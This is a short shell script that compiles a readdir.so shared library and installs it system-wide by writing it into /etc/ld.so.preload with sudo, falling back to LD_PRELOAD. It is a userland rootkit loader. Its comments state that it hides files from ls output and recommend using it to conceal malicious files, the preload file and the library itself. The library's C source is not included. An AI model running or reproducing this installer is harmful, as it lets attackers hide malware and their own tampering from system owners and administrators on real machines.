#!/usr/bin/env sh

# Compiling
gcc -ldl readdir.c -fPIC -shared -D_GNU_SOURCE -o readdir.so
if [ $? -ne 0 ]; then
	gcc readdir.c -fPIC -shared -D_GNU_SOURCE -o readdir.so -ldl
fi
# Pre-loading methods
sudo sh -c "echo $(pwd)/readdir.so > /etc/ld.so.preload"
if [ $? -ne 0 ]; then
	export LD_PRELOAD=$(pwd)/readdir.so
fi

# It is to be noted that you can still modify the file or cat out
# it's contents. However, it will not show in the output of the ls
# command! This can be very useful if you want to hide malicious
# files, alter filenames, etc. One very popular use is to hide the
# /etc/ld.so.preload file or the shared object itself!

# This can be added
# sudo sh -c "echo '' > /etc/ld.so.preload"
